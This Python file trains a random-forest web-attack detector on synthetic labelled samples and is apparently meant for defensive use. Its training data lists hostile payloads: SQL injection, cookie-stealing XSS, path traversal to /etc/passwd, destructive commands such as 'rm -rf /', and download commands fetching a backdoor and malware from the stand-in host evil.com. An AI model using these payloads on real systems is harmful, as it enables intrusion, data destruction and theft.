# security_ml_pipeline.py
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
import re
import os
import json
import pickle
from datetime import datetime
import requests
import io

class SecurityMLPipeline:
    """
    Pipeline completo: Data Collection -> Training -> Export .pkl
    Fuentes: Kaggle-style datasets + Synthetic data
    """
    
    def __init__(self):
        self.vectorizer = TfidfVectorizer(max_features=1500, ngram_range=(1, 3))
        self.model = RandomForestClassifier(n_estimators=100, random_state=42, n_jobs=-1)
        self.training_data = None
        self.is_trained = False
        
    def collect_kaggle_style_data(self):
        """
        Recopilar datos estilo Kaggle de múltiples fuentes
        """
        print("📥 Recopilando datos de fuentes estilo Kaggle...")
        
        # Fuente 1: Datos sintéticos de ataques OWASP
        owasp_attacks = self._generate_owasp_attacks()
        
        # Fuente 2: Patrones CSIC 2010 (simulados)
        csic_patterns = self._generate_csic_patterns()
        
        # Fuente 3: Tráfico normal simulado
        normal_traffic = self._generate_normal_traffic()
        
        # Combinar todas las fuentes
        all_texts = owasp_attacks['texts'] + csic_patterns['texts'] + normal_traffic['texts']
        all_labels = owasp_attacks['labels'] + csic_patterns['labels'] + normal_traffic['labels']
        
        self.training_data = pd.DataFrame({
            'text': all_texts,
            'label': all_labels,
            'source': ['owasp']*len(owasp_attacks['texts']) + 
                     ['csic']*len(csic_patterns['texts']) + 
                     ['normal']*len(normal_traffic['texts'])
        })
        
        print(f"✅ Datos recopilados: {len(self.training_data)} muestras")
        print(f"   - Ataques: {sum(all_labels)}")
        print(f"   - Normales: {len(all_labels) - sum(all_labels)}")
        
        return self.training_data
    
    def _generate_owasp_attacks(self):
        """Generar ataques OWASP Top 10 realistas"""
        attacks = {
            'sql_injection': [
                "admin' OR '1'='1'--", "' UNION SELECT username, password FROM users--",
                "'; DROP TABLE users;--", "' OR 1=1--", "admin'/*", 
                "' AND 1=0 UNION ALL SELECT credit_cards FROM customers--",
                "'; EXEC xp_cmdshell('format c:');--", "' WAITFOR DELAY '00:00:10'--"
            ],
            'xss': [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert(document.cookie)>",
                "<body onload=alert('pwned')>", "<svg onload=alert(1)>",
                "javascript:alert('XSS')", "script alert(1) script",
                "<iframe src='javascript:alert(`xss`)'>", "<div onmouseover='alert(1)'>"
            ],
            'path_traversal': [
                "../../../etc/passwd", "..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%255c..%255c..%255cwindows%255csystem32%255ccmd.exe"
            ],
            'command_injection': [
                "| cat /etc/passwd", "; rm -rf /", "&& shutdown /s /t 0",
                "| net user hacker Password123 /add", "; wget http://evil.com/backdoor.sh",
                "&& curl http://evil.com/malware.exe -o malware.exe"
            ],
            'xxe': [
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "<!DOCTYPE test [ <!ENTITY % init SYSTEM 'http://evil.com/evil.dtd'> %init;]>"
            ]
        }
        
        texts = []
        for category, samples in attacks.items():
            texts.extend(samples)
        
        return {'texts': texts, 'labels': [1] * len(texts)}
    
    def _generate_csic_patterns(self):
        """Generar patrones estilo CSIC 2010"""
        patterns = {
            'parameter_pollution': [
                "user=admin&user=guest", "id=1&id=2&id=3",
                "amount=100&amount=1000", "role=user&role=admin"
            ],
            'buffer_overflow': [
                "A" * 1000, "username=" + "x" * 500, 
                "password=" + "y" * 1000, "data=" + "z" * 2000
            ],
            'integer_overflow': [
                "page=9999999999", "limit=2147483648", "offset=-1",
                "id=0xFFFFFFFF", "size=18446744073709551615"
            ],
            'format_string': [
                "user=%s%s%s%s%s", "error=%n%n%n%n", "msg=%x%x%x%x",
                "debug=%p%p%p%p", "log=%s" * 100
            ]
        }
        
        texts = []
        for category, samples in patterns.items():
            texts.extend(samples)
        
        return {'texts': texts, 'labels': [1] * len(texts)}
    
    def _generate_normal_traffic(self):
        """Generar tráfico normal legítimo"""
        normal_data = {
            'api_requests': [
                "/api/users/list?page=1&limit=10", "/api/products/search?q=laptop",
                "/auth/login?user=john&pass=secure123", "/api/orders/12345",
                "/health/status", "/metrics/prometheus", "/docs/swagger.json"
            ],
            'web_traffic': [
                "/home", "/about", "/contact", "/products/category/electronics",
                "/user/profile", "/cart/checkout", "/search?term=hello+world"
            ],
            'file_paths': [
                "/static/css/main.css", "/images/logo.png", "/js/app.js",
                "/fonts/roboto.woff2", "/downloads/document.pdf"
            ],
            'data_inputs': [
                "user@company.com", "securePassword123!", "John Smith",
                "123 Main Street", "+1-555-0123", "2023-12-01"
            ]
        }
        
        texts = []
        for category, samples in normal_data.items():
            texts.extend(samples)
        
        return {'texts': texts, 'labels': [0] * len(texts)}
    
    def extract_advanced_features(self, texts):
        """Extraer características avanzadas para mejor precisión"""
        features = []
        
        for text in texts:
            feature_dict = {
                'length': len(text),
                'special_chars': len(re.findall(r'[<>;=\'\"&|%]', text)),
                'sql_keywords': len(re.findall(r'\b(SELECT|UNION|DROP|INSERT|UPDATE|DELETE|EXEC)\b', text, re.IGNORECASE)),
                'xss_patterns': len(re.findall(r'<script|javascript:|on\w+=', text, re.IGNORECASE)),
                'path_traversal': len(re.findall(r'\.\./|\.\.\\|etc/passwd|win\.ini', text, re.IGNORECASE)),
                'entropy': self._calculate_entropy(text),
                'url_encoded': len(re.findall(r'%[0-9a-fA-F]{2}', text)),
                'whitespace_ratio': len(re.findall(r'\s', text)) / max(1, len(text))
            }
            features.append(list(feature_dict.values()))
        
        return np.array(features)
    
    def _calculate_entropy(self, text):
        """Calcular entropía de Shannon"""
        if len(text) == 0:
            return 0
        entropy = 0
        for char in set(text):
            p_x = text.count(char) / len(text)
            if p_x > 0:
                entropy += -p_x * np.log2(p_x)
        return entropy
    
    def train_model(self, test_size=0.2):
        """Entrenar el modelo con validación"""
        if self.training_data is None:
            self.collect_kaggle_style_data()
        
        print("🔄 Procesando características...")
        
        # TF-IDF Features
        X_tfidf = self.vectorizer.fit_transform(self.training_data['text'])
        
        # Advanced Features
        X_advanced = self.extract_advanced_features(self.training_data['text'])
        
        # Combinar características
        X_combined = np.hstack([X_tfidf.toarray(), X_advanced])
        y = self.training_data['label']
        
        # Split train/test
        X_train, X_test, y_train, y_test = train_test_split(
            X_combined, y, test_size=test_size, random_state=42, stratify=y
        )
        
        print("🎯 Entrenando modelo...")
        self.model.fit(X_train, y_train)
        
        # Evaluación
        y_pred = self.model.predict(X_test)
        accuracy = accuracy_score(y_test, y_pred)
        
        print(f"✅ Modelo entrenado - Precisión: {accuracy:.4f}")
        print("\n📊 Reporte de clasificación:")
        print(classification_report(y_test, y_pred, target_names=['Normal', 'Ataque']))
        
        self.is_trained = True
        return accuracy
    
    def export_model(self, output_dir="output"):
        """Exportar modelo completo a .pkl"""
        if not self.is_trained:
            print("❌ Modelo no entrenado. Entrena primero.")
            return False
        
        # Crear directorio output si no existe
        os.makedirs(output_dir, exist_ok=True)
        
        # Preparar datos para exportación
        model_package = {
            'model': self.model,
            'vectorizer': self.vectorizer,
            'training_data_info': {
                'samples': len(self.training_data),
                'features': self.vectorizer.get_feature_names_out().shape[0],
                'classes': self.training_data['label'].nunique(),
                'sources': self.training_data['source'].value_counts().to_dict()
            },
            'metadata': {
                'export_date': datetime.now().isoformat(),
                'model_type': 'RandomForest',
                'accuracy': self.model.score,
                'version': '1.0.0'
            }
        }
        
        # Exportar .pkl
        model_path = os.path.join(output_dir, 'security_model.pkl')
        with open(model_path, 'wb') as f:
            pickle.dump(model_package, f)
        
        # Exportar dataset usado (opcional)
        data_path = os.path.join(output_dir, 'training_dataset.csv')
        self.training_data.to_csv(data_path, index=False)
        
        print(f"✅ Modelo exportado: {model_path}")
        print(f"✅ Dataset exportado: {data_path}")
        print(f"📦 Paquete completo guardado en: {output_dir}/")
        
        return True
    
    def quick_test(self):
        """Prueba rápida del modelo entrenado"""
        if not self.is_trained:
            print("❌ Modelo no entrenado")
            return
        
        test_cases = [
            ("/api/users", "normal query"),  # Normal
            ("/login", "admin' OR '1'='1"),  # SQLi
            ("/search", "<script>alert(1)</script>"),  # XSS
            ("/download", "../../../etc/passwd"),  # Path traversal
        ]
        
        print("\n🧪 PRUEBA RÁPIDA DEL MODELO:")
        print("-" * 50)
        
        for path, payload in test_cases:
            text = f"{path} {payload}"
            
            # Preparar características
            X_tfidf = self.vectorizer.transform([text])
            X_advanced = self.extract_advanced_features([text])
            X_combined = np.hstack([X_tfidf.toarray(), X_advanced])
            
            # Predecir
            prediction = self.model.predict(X_combined)[0]
            probability = self.model.predict_proba(X_combined)[0]
            confidence = probability[1] if prediction == 1 else probability[0]
            
            status = "🚨 ATAQUE" if prediction == 1 else "✅ NORMAL"
            print(f"{status} | Confianza: {confidence:.1%} | {path}")

# ==================== EJECUCIÓN COMPLETA ====================
def run_complete_pipeline():
    """Ejecutar pipeline completo: Data -> Train -> Export"""
    print("🚀 INICIANDO PIPELINE COMPLETO DE SEGURIDAD")
    print("=" * 60)
    
    # 1. Inicializar pipeline
    pipeline = SecurityMLPipeline()
    
    # 2. Recopilar datos (estilo Kaggle)
    pipeline.collect_kaggle_style_data()
    
    # 3. Entrenar modelo
    accuracy = pipeline.train_model()
    
    # 4. Probar modelo
    pipeline.quick_test()
    
    # 5. Exportar a .pkl
    success = pipeline.export_model("output")
    
    if success:
        print("\n🎉 PIPELINE COMPLETADO EXITOSAMENTE")
        print("📁 Archivos generados en carpeta 'output/':")
        print("   - security_model.pkl (modelo entrenado)")
        print("   - training_dataset.csv (datos de entrenamiento)")
    else:
        print("\n❌ Error en el pipeline")

# ==================== EJECUCIÓN RÁPIDA ====================
if __name__ == "__main__":
    run_complete_pipeline()